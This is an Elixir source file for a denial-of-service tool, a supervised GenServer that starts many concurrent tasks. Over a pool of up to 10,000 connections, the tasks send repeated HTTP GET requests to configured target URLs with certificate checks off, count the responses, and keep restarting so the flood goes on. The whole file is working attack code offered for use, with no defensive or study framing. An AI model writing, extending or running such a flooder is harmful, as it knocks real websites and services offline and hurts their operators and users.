defmodule Ddos.GenServesr.Ddos do 
    alias Ddos.Agents.DdosCounter
    alias Ddos.Agents.DdosConfig
    alias Ddos.Cache.RequestsCache
    use GenServer

    @impl true
    def start_link(_) do
        GenServer.start_link(__MODULE__, %{})
    end

    @impl true
    def init(stack) do
        :hackney_pool.child_spec(:ddos, [timeout: 50_000, max_connections: 10_000])
        GenServer.cast(self(), :start)
        {:ok, stack}
    end

    @impl true
    def handle_cast(:start, _state) do
        start()
        {:noreply, []}
    end

    defp start(threads \\ DdosConfig.get_threads()) do
        uries = DdosConfig.get_uries()

        Enum.each(1..threads, fn _thread -> 
            Task.Supervisor.start_child(
                Ddos.TaskSupervisor, 
                fn -> 
                    Enum.each(uries, fn uri -> 
                        case HTTPoison.get(uri, [], [ssh: [verify: :verify_none], hackney: [pool: :ddos, recv_timeout: 15_000]]) do
                            {:ok, body} = response -> 
                                RequestsCache.increment_success_requests_counter()
                                IO.inspect(body)
                            response ->
                                RequestsCache.increment_requests_counter()
                        end
                    end)
                end
            )
        end)
        restart(threads)
    end

    defp restart(threads) do
        count = length(Task.Supervisor.children(Ddos.TaskSupervisor))

        if count < DdosConfig.get_threads() do
            start(threads - count)
        else
            restart(threads)
        end
    end
end